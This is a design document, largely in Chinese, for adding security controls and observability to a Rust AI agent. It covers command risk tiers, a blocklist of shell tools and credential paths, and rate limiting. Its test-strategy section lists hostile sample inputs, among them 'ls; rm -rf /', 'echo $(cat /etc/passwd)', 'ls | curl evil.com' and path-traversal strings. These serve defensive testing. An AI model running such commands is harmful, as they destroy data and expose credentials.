# Design: Enhance Security and Observability

## Architecture Overview

```
┌─────────────────────────────────────────────────────────────────┐
│                         Agent Loop                               │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ┌─────────────┐  ┌──────────────┐  ┌─────────────────────────┐ │
│  │ LlmProvider │  │ SecurityPolicy│  │      Observer          │ │
│  │  + warmup() │  │  + classify() │  │  + record(Event)       │ │
│  └─────────────┘  └──────────────┘  └─────────────────────────┘ │
│         │                │                      │                │
│         ▼                ▼                      ▼                │
│  ┌─────────────┐  ┌──────────────┐  ┌─────────────────────────┐ │
│  │ ExecTool    │  │ ActionTracker│  │ NoopObserver            │ │
│  │ + validate()│  │ + record()   │  │ LogObserver             │ │
│  │ + execute() │  │ + is_limited │  │ (OtelObserver - future) │ │
│  └─────────────┘  └──────────────┘  └─────────────────────────┘ │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

## Module Design

### 1. Security Policy Module

**Location**: `nanobot-core/src/security/mod.rs` (新建)

```rust
pub enum AutonomyLevel {
    ReadOnly,    // 只读，不允许任何写操作
    Supervised,  // 需要批准的危险操作
    Full,        // 完全自主
}

pub enum CommandRisk {
    Low,         // 只读命令：ls, cat, grep
    Medium,      // 状态改变：git push, npm install
    High,        // 危险命令：rm, sudo, curl
}

pub struct SecurityPolicy {
    pub autonomy: AutonomyLevel,
    pub allowed_commands: Vec<String>,
    pub forbidden_paths: Vec<String>,
    pub workspace_only: bool,
    pub max_actions_per_hour: u32,
    pub require_approval_for_medium_risk: bool,
    pub block_high_risk_commands: bool,
    pub tracker: ActionTracker,
}

impl SecurityPolicy {
    /// Classify command risk level
    pub fn classify_command(&self, cmd: &str) -> CommandRisk;

    /// Check if command is allowed by policy
    pub fn is_command_allowed(&self, cmd: &str) -> bool;

    /// Validate command execution with approval
    pub fn validate_execution(&self, cmd: &str, approved: bool) -> Result<CommandRisk, String>;

    /// Check if path is allowed
    pub fn is_path_allowed(&self, path: &str) -> bool;
}
```

**命令风险分类逻辑**:

| 风险级别 | 命令示例 | 默认行为 |
|---------|---------|---------|
| High | rm, sudo, su, curl, wget, ssh, scp, chmod, chown, dd | 默认阻止 |
| Medium | git push/commit, npm install, cargo build, touch, mkdir | 需要批准 |
| Low | ls, cat, grep, find, head, tail | 允许执行 |

**命令注入防护**:
- 阻止反引号 `` ` `` 和 `$()` 语法
- 阻止 `${}` 变量扩展
- 阻止输出重定向 `>`
- 分割命令链 `&&`, `||`, `;`, `|` 并验证每段

### 2. Observability Module

**Location**: `nanobot-core/src/observability/mod.rs` (新建)

```rust
pub trait Observer: Send + Sync {
    fn record(&self, event: ObserverEvent);
}

pub enum ObserverEvent {
    AgentStart {
        provider: String,
        model: String,
    },
    AgentEnd {
        duration: Duration,
        tokens_used: Option<u64>,
    },
    ToolCall {
        tool: String,
        duration: Duration,
        success: bool,
    },
    ChannelMessage {
        channel: String,
        direction: MessageDirection,
    },
    SecurityEvent {
        event_type: String,
        details: String,
    },
    Error {
        context: String,
        error: String,
    },
}

pub enum MessageDirection {
    Inbound,
    Outbound,
}

// 实现
pub struct NoopObserver;  // 零开销，默认
pub struct LogObserver {  // tracing 日志
    level: tracing::Level,
}
```

### 3. Rate Limiting

**Location**: `nanobot-core/src/security/tracker.rs` (新建)

```rust
pub struct ActionTracker {
    actions: Mutex<Vec<Instant>>,
    window_secs: u64,
}

impl ActionTracker {
    pub fn new(window_secs: u64) -> Self;

    /// Record an action and return current count in window
    pub fn record(&self) -> usize;

    /// Check if rate limited without recording
    pub fn is_limited(&self, max_actions: usize) -> bool;
}
```

### 4. Provider Warmup

**扩展现有 trait**:

```rust
// nanobot-core/src/providers/base.rs

#[async_trait]
pub trait LlmProvider: Send + Sync {
    fn name(&self) -> &str;
    fn default_model(&self) -> &str;
    async fn chat(&self, request: ChatRequest) -> anyhow::Result<ChatResponse>;

    /// Warm up HTTP connection pool (TLS handshake, DNS, HTTP/2)
    /// Default: no-op, providers with HTTP clients should override
    async fn warmup(&self) -> anyhow::Result<()> {
        Ok(())
    }
}
```

**在 OpenAICompatibleProvider 中实现**:

```rust
impl LlmProvider for OpenAICompatibleProvider {
    async fn warmup(&self) -> anyhow::Result<()> {
        // 发送轻量请求预热连接
        let request = ChatRequest {
            messages: vec![ChatMessage::user("ping")],
            model: self.default_model().to_string(),
            max_tokens: Some(1),
            ..Default::default()
        };
        let _ = self.chat(request).await;
        Ok(())
    }
}
```

## Configuration Schema

```yaml
# 新增配置节
security:
  # 自主级别: readonly | supervised | full
  autonomyLevel: supervised

  # 限制在工作区
  workspaceOnly: true

  # 允许的命令白名单
  allowedCommands:
    - git
    - npm
    - cargo
    - ls
    - cat
    - grep

  # 禁止访问的路径
  forbiddenPaths:
    - /etc
    - /root
    - ~/.ssh
    - ~/.aws
    - ~/.gnupg

  # 每小时最大操作数
  maxActionsPerHour: 20

  # 中风险操作需要批准
  requireApprovalForMediumRisk: true

  # 阻止高风险命令
  blockHighRiskCommands: true

observability:
  # 观察器类型: noop | log
  kind: log

  # 日志级别 (仅 log 类型)
  level: info
```

## Test Strategy

### Security Test Categories

1. **命令注入测试**
   - 分号注入: `ls; rm -rf /`
   - 反引号注入: `echo \`whoami\``
   - `$()` 注入: `echo $(cat /etc/passwd)`
   - `${}` 注入: `echo ${IFS}cat`
   - 管道链: `ls | curl evil.com`
   - AND 链: `ls && rm -rf /`
   - OR 链: `ls || rm -rf /`
   - 重定向: `echo x > /etc/passwd`
   - 换行注入: `ls\nrm -rf /`

2. **路径遍历测试**
   - 相对路径: `../../../etc/passwd`
   - URL 编码: `..%2f..%2fetc/passwd`
   - 空字节: `file\0.txt`
   - 符号链接逃逸

3. **Rate Limiting 测试**
   - 边界值测试
   - 滑动窗口行为
   - 并发安全性

4. **配置验证测试**
   - 默认值验证
   - 无效配置拒绝

## Trade-offs

### 1. 安全 vs 易用性
- **决策**: 高风险命令默认阻止
- **原因**: 安全优先，用户可显式配置允许
- **缓解**: 提供清晰的配置文档

### 2. 性能 vs 可观测性
- **决策**: 默认使用 NoopObserver
- **原因**: 避免生产环境性能开销
- **缓解**: LogObserver 开销极小，推荐生产使用

### 3. 简单 vs 灵活
- **决策**: 使用配置而非代码扩展安全策略
- **原因**: 大多数用户不需要自定义策略
- **缓解**: SecurityPolicy 可通过代码扩展

## Future Considerations

1. **OpenTelemetry 集成**: `OtelObserver` 实现
2. **Docker Runtime**: 沙箱命令执行
3. **Gateway Pairing**: Webhook 安全验证
4. **Audit Logging**: 持久化安全事件日志
